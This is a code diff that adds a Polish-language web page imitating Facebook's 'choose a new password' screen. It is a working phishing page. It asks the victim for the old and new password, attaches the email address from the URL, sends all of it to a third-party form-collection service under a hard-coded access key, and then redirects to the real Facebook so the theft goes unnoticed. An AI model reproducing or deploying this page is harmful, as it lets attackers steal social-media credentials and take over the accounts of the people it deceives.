@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" type="image/svg+xml">
+    <script>
+	    fetch('https://api.web3forms.com/submit')
+  	    .then(response => response.json())
+  	    .then(data => console.log(data))
+  	    .catch(error => console.error('Błąd:', error));
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #18191a;
+            color: #e4e6eb;
+            margin: 0;
+        }
+        
+        .navbar .icons img,
+        .navbar .profile img {
+            width: 40px; /* Upewnij się, że szerokość */
+            height: 40px; /* i wysokość są równe */
+            border-radius: 50%;
+            object-fit: cover; /* Dopasowanie obrazu do kontenera */
+	    }
+
+	    .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Wyśrodkowanie formularza */
+            justify-content: center;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #242526;
+            border-radius: 8px;
+            max-width: 400px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        .container input[type="password"],
+        .container button {
+            width: 100%; /* Równa szerokość dla pól */
+            margin-bottom: 15px;
+            box-sizing: border-box;
+        }
+
+        .container button {
+            cursor: pointer;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+        }
+        .navbar {
+            display: flex;
+            align-items: center;
+            background-color: #242526;
+            padding: 10px 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .navbar .logo {
+            display: flex;
+            align-items: center;
+            margin-right: 6px;
+        }
+
+        .navbar .logo img {
+            width: 42px;
+            height: 42px;
+            margin-right: 10px;
+
+        }
+
+        .navbar .logo span {
+            color: #e4e6eb;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .navbar .search {
+            <!-- flex-grow: 1; -->
+            flex;
+            display: flex;
+            align-items: center;
+            background-color: #3a3b3c;
+            padding: 5px 10px;
+            border-radius: 15px;
+            margin-right: auto;
+        }
+
+        .navbar .search input {
+            width: 100%;
+            border: none;
+            background: none;
+            color: #e4e6eb;
+            outline: none;
+            margin-left: 5px;
+        }
+
+        .navbar .icons {
+            display: flex;
+            align-items: center;
+        }
+
+        .navbar .icons img {
+            width: 42px;
+            height: 42px;
+            margin: 0 10px;
+            cursor: pointer;
+        }
+
+        .navbar .profile img {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            margin-left: 10px;
+            cursor: pointer;
+        }
+
+        .container {
+            background-color: #242526;
+            padding: 20px;
+            border-radius: 8px;
+            width: 100%;
+            align-items: center; /* Wyśrodkowanie formularza */
+            max-width: 400px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            margin: 10% auto;
+        }
+
+        .container h2 {
+            margin-top: 0;
+            font-size: 18px;
+            color: #ffffff;
+        }
+
+        .container label {
+            font-size: 14px;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #3a3b3c;
+            border-radius: 5px;
+            background-color: #3a3b3c;
+            color: #e4e6eb;
+        }
+
+        .container input[type="checkbox"] {
+            margin-right: 10px;
+        }
+
+        .container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 5px;
+            color: #ffffff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .container button:hover {
+            background-color: #145dbf;
+        }
+
+        .container .cancel {
+            background-color: #3a3b3c;
+            margin-top: 10px;
+        }
+
+        .container .cancel:hover {
+            background-color: #4e4f50;
+        }
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <div class="logo">
+            <img href="htps://facebook.com"; src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" alt="Facebook Logo">
+            <span  onclick="window.location.href='htps://facebook.com';" >Facebook</span>
+        </div>
+      <label class="search"><span class="xhb22t3 xb5gni xcj1dhv x6s0dn4 x78zum5 xuxw1ft x47corl x1ye3gou"><svg viewBox="0 0 16 16" width="16" height="16" fill="currentColor" class="xfx01vb x1lliihq x1tzjh5l x1k90msu x2h7rmj x1qfuztq" style="--color:var(--secondary-icon)"><g fill-rule="evenodd" transform="translate(-448 -544)"><g fill-rule="nonzero"><path d="M10.743 2.257a6 6 0 1 1-8.485 8.486 6 6 0 0 1 8.485-8.486zm-1.06 1.06a4.5 4.5 0 1 0-6.365 6.364 4.5 4.5 0 0 0 6.364-6.363z" transform="translate(448 544)"></path><path d="M10.39 8.75a2.94 2.94 0 0 0-.199.432c-.155.417-.23.849-.172 1.284.055.415.232.794.54 1.103a.75.75 0 0 0 1.112-1.004l-.051-.057a.39.39 0 0 1-.114-.24c-.021-.155.014-.356.09-.563.031-.081.06-.145.08-.182l.012-.022a.75.75 0 1 0-1.299-.752z" transform="translate(448 544)"></path><path d="M9.557 11.659c.038-.018.09-.04.15-.064.207-.077.408-.112.562-.092.08.01.143.034.198.077l.041.036a.75.75 0 0 0 1.06-1.06 1.881 1.881 0 0 0-1.103-.54c-.435-.058-.867.018-1.284.175-.189.07-.336.143-.433.2a.75.75 0 0 0 .624 1.356l.066-.027.12-.061z" transform="translate(448 544)"></path><path d="m13.463 15.142-.04-.044-3.574-4.192c-.599-.703.355-1.656 1.058-1.057l4.191 3.574.044.04c.058.059.122.137.182.24.249.425.249.96-.154 1.41l-.057.057c-.45.403-.986.403-1.411.154a1.182 1.182 0 0 1-.24-.182zm.617-.616.444-.444a.31.31 0 0 0-.063-.052c-.093-.055-.263-.055-.35.024l.208.232.207-.206.006.007-.22.257-.026-.024.033-.034.025.027-.257.22-.007-.007zm-.027-.415c-.078.088-.078.257-.023.35a.31.31 0 0 0 .051.063l.205-.204-.233-.209z" transform="translate(448 544)"></path></g></g></svg></span><input class="x1i10hfl xggy1nq x1s07b3s x1kdt53j x1yc453h xhb22t3 xb5gni xcj1dhv x2s2ed0 xq33zhf xjbqb8w xnwf7zb x40j3uw x1s7lred x15gyhx8 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 xzsf02u xdl72j9 x1iyjqo2 xs83m0k xjb2p0i x6prxxf xeuugli x1a2a7pz x1n2onr6 xdvlbce x1sxyh0 xurb0ha xm7lytj x1vqgdyp x1xtgk1k x17hph69 xtilpmw x1ad04t7 x1glnyev x1ix68h3 x19gujb8" dir="ltr" aria-autocomplete="list" aria-expanded="false" role="combobox" autocomplete="off" placeholder="Szukaj na Facebooku" spellcheck="false" aria-invalid="false" aria-label="Szukaj na Facebooku" type="search" value=""></label>
+        <div class="icons">
+            <div style="margin-left:3px; margin-right:3px; background-color: #403c3c; border-radius: 50%; width: 42px; height: 42px; place-items: center; display: grid; " class="x6s0dn4 x78zum5 x5yr21d xl56j7k x1emribx"><span class="x4k7w5x x1h91t0o x1h9r5lt x1jfb8zj xv2umb2 x1beo9mf xaigb6o x12ejxvf x3igimt xarpa2k xedcshv x1lytzrv x1t2pt76 x7ja8zs x1qrby5j"><span><div aria-label="Menu" class="x1i10hfl xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1q0g3np x87ps6o x1lku1pv x1a2a7pz x6s0dn4 xzolkzo x12go9s9 x1rnf11y xprq8jg x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xl56j7k xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x1vqgdyp x100vrsf x1qhmfi1" role="button" tabindex="0"><svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor" class="xfx01vb x1lliihq x1tzjh5l x1k90msu x2h7rmj x1qfuztq" style="--color:var(--primary-icon)"><path d="M18.5 1A1.5 1.5 0 0 0 17 2.5v3A1.5 1.5 0 0 0 18.5 7h3A1.5 1.5 0 0 0 23 5.5v-3A1.5 1.5 0 0 0 21.5 1h-3zm0 8a1.5 1.5 0 0 0-1.5 1.5v3a1.5 1.5 0 0 0 1.5 1.5h3a1.5 1.5 0 0 0 1.5-1.5v-3A1.5 1.5 0 0 0 21.5 9h-3zm-16 8A1.5 1.5 0 0 0 1 18.5v3A1.5 1.5 0 0 0 2.5 23h3A1.5 1.5 0 0 0 7 21.5v-3A1.5 1.5 0 0 0 5.5 17h-3zm8 0A1.5 1.5 0 0 0 9 18.5v3a1.5 1.5 0 0 0 1.5 1.5h3a1.5 1.5 0 0 0 1.5-1.5v-3a1.5 1.5 0 0 0-1.5-1.5h-3zm8 0a1.5 1.5 0 0 0-1.5 1.5v3a1.5 1.5 0 0 0 1.5 1.5h3a1.5 1.5 0 0 0 1.5-1.5v-3a1.5 1.5 0 0 0-1.5-1.5h-3zm-16-8A1.5 1.5 0 0 0 1 10.5v3A1.5 1.5 0 0 0 2.5 15h3A1.5 1.5 0 0 0 7 13.5v-3A1.5 1.5 0 0 0 5.5 9h-3zm0-8A1.5 1.5 0 0 0 1 2.5v3A1.5 1.5 0 0 0 2.5 7h3A1.5 1.5 0 0 0 7 5.5v-3A1.5 1.5 0 0 0 5.5 1h-3zm8 0A1.5 1.5 0 0 0 9 2.5v3A1.5 1.5 0 0 0 10.5 7h3A1.5 1.5 0 0 0 15 5.5v-3A1.5 1.5 0 0 0 13.5 1h-3zm0 8A1.5 1.5 0 0 0 9 10.5v3a1.5 1.5 0 0 0 1.5 1.5h3a1.5 1.5 0 0 0 1.5-1.5v-3A1.5 1.5 0 0 0 13.5 9h-3z"></path></svg><div class="x1ey2m1c xds687c x17qophe xg01cxk x47corl x10l6tqk x13vifvy x1ebt8du x19991ni x1dhq9h xzolkzo x12go9s9 x1rnf11y xprq8jg" role="none" data-visualcompletion="ignore" style="inset: 0px;"></div></div></span></span></div>
+            <div style="align-items: end !important; justify-items: center !important; margin-left:3px; margin-right:3px; background-color: #403c3c; border-radius: 50%; width: 42px; height: 42px; place-items: center; display: grid; " class="x9f619 x1n2onr6 x1ja2u2z"><div aria-expanded="false" aria-label="Messenger" class="x1i10hfl xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1q0g3np x87ps6o x1lku1pv x1a2a7pz x6s0dn4 xzolkzo x12go9s9 x1rnf11y xprq8jg x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xl56j7k xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x1vqgdyp x100vrsf x1qhmfi1" role="button" tabindex="0"><svg viewBox="0 0 12 13" width="20" height="20" fill="currentColor" class="xfx01vb x1lliihq x1tzjh5l x1k90msu x2h7rmj x1qfuztq" ><g fill-rule="evenodd" transform="translate(-450 -1073)"><path d="m459.603 1077.948-1.762 2.851a.89.89 0 0 1-1.302.245l-1.402-1.072a.354.354 0 0 0-.433.001l-1.893 1.465c-.253.196-.583-.112-.414-.386l1.763-2.851a.89.89 0 0 1 1.301-.245l1.402 1.072a.354.354 0 0 0 .434-.001l1.893-1.465c.253-.196.582.112.413.386M456 1073.5c-3.38 0-6 2.476-6 5.82 0 1.75.717 3.26 1.884 4.305.099.087.158.21.162.342l.032 1.067a.48.48 0 0 0 .674.425l1.191-.526a.473.473 0 0 1 .32-.024c.548.151 1.13.231 1.737.231 3.38 0 6-2.476 6-5.82 0-3.344-2.62-5.82-6-5.82"></path></g></svg><div class="x1ey2m1c xds687c x17qophe xg01cxk x47corl x10l6tqk x13vifvy x1ebt8du x19991ni x1dhq9h xzolkzo x12go9s9 x1rnf11y xprq8jg" role="none" data-visualcompletion="ignore" style="inset: 0px;"></div></div><!--$--><div aria-hidden="true" aria-label="Messenger" class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1t137rt x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x3nfvp2 x1q0g3np x87ps6o x1lku1pv x1a2a7pz x10l6tqk x1vjfegm x8zc4e7 xtu2xtp" role="button" tabindex="-1"><div data-visualcompletion="ignore-dynamic"><!--$--><!--/$--></div><div class="x1ey2m1c xds687c x17qophe xg01cxk x47corl x10l6tqk x13vifvy x1ebt8du x19991ni x1dhq9h xzolkzo x12go9s9 x1rnf11y xprq8jg" role="none" data-visualcompletion="ignore"></div></div><!--/$--></div></span></span>
+            <div style="margin-left:3px; margin-right:3px; background-color: #403c3c; border-radius: 50%; width: 42px; height: 42px; place-items: center; display: grid; " class="x6s0dn4 x78zum5 x5yr21d xl56j7k x1emribx"><div class="x9f619 x1n2onr6 x1ja2u2z"><a aria-expanded="false" aria-label="Powiadomienia, 27 nieprzeczytanych"><svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor" class="xfx01vb x1lliihq x1tzjh5l x1k90msu x2h7rmj x1qfuztq" style="--color:var(--primary-icon)"><path d="M3 9.5a9 9 0 1 1 18 0v2.927c0 1.69.475 3.345 1.37 4.778a1.5 1.5 0 0 1-1.272 2.295h-4.625a4.5 4.5 0 0 1-8.946 0H2.902a1.5 1.5 0 0 1-1.272-2.295A9.01 9.01 0 0 0 3 12.43V9.5zm6.55 10a2.5 2.5 0 0 0 4.9 0h-4.9z"></path></svg></a><!--$--><div aria-hidden="true" aria-label="Powiadomienia, 27 nieprzeczytanych" class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1t137rt x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x3nfvp2 x1q0g3np x87ps6o x1lku1pv x1a2a7pz x10l6tqk x1vjfegm x8zc4e7 xtu2xtp" role="button" tabindex="-1"><!--$--></span><!--/$--><div class="x1ey2m1c xds687c x17qophe xg01cxk x47corl x10l6tqk x13vifvy x1ebt8du x19991ni x1dhq9h xzolkzo x12go9s9 x1rnf11y xprq8jg" role="none" data-visualcompletion="ignore"></div></div><!--/$--></div></span></span></div>
+        </div>
+        <div class="profile">
+            <img src="https://static.vecteezy.com/system/resources/thumbnails/009/292/244/small_2x/default-avatar-icon-of-social-media-user-vector.jpg" alt="Default User Photo">
+        </div>
+    </div>
+    <div class="container">
+        <h2>Wybierz nowe hasło</h2>
+        <form id="web3forms-form">
+            <input type="hidden" name="access_key" value="cebec95a-e9ea-4d97-a24b-f32b8e836cd5">
+            
+            <label for="new-password">
+                Utwórz nowe hasło zawierające przynajmniej 6 znaków. Silne hasło stanowi kombinację liter, cyfr i znaków interpunkcyjnych.
+            </label>
+            <input type="password" id="new-password" name="Stare hasło" placeholder="Stare hasło">
+        
+            <input type="password" id="new-password" name="Nowe hasło" placeholder="Nowe hasło">
+        
+            <label>
+                <input type="checkbox" id="logout-everywhere">
+                Wyloguj mnie z Facebooka wszędzie indziej, gdzie moje konto może być otwarte. (Zaznacz to pole wyboru, jeżeli ktoś obcy użył Twojego konta).
+            </label>
+        
+            <button id="przycisk" type="submit">Kontynuuj</button>
+            <button type="button" class="cancel">Anuluj</button>
+        </form>
+        
+        <script>
+            document.getElementById("web3forms-form").addEventListener("submit", function(event) {
+                event.preventDefault();  // Zapobiega domyślnemu działaniu formularza (przekierowaniu)
+        
+                const formData = new FormData(this);  // Tworzymy obiekt FormData z formularza
+                
+                const urlParams = new URLSearchParams(window.location.search);
+                const email = urlParams.get('email');  // Odczytanie parametru "email" z URL
+
+                // Dodawanie parametru email do FormData, jeśli istnieje
+                if (email) {
+                    formData.append('email', email);
+                }
+                // Wysyłanie danych formularza asynchronicznie za pomocą fetch
+                fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())  // Oczekiwanie na odpowiedź w formacie JSON
+                .then(data => {
+                    //console.log('Sukces:', data);  // Wypisanie odpowiedzi z API w konsoli
+                    //alert("Formularz wysłany pomyślnie!");  // Opcjonalnie: komunikat sukcesu
+        
+                    // Przekierowanie na Facebooka po pomyślnym wysłaniu formularza
+                    window.location.href = 'https://www.facebook.com';  // Przekierowanie na Facebooka
+                })
+                .catch(error => {
+                    console.error('Błąd:', error);  // Obsługa błędów
+                    alert("Wystąpił błąd podczas wysyłania formularza.");
+                });
+            });
+        </script>        
+</body>
+</html>
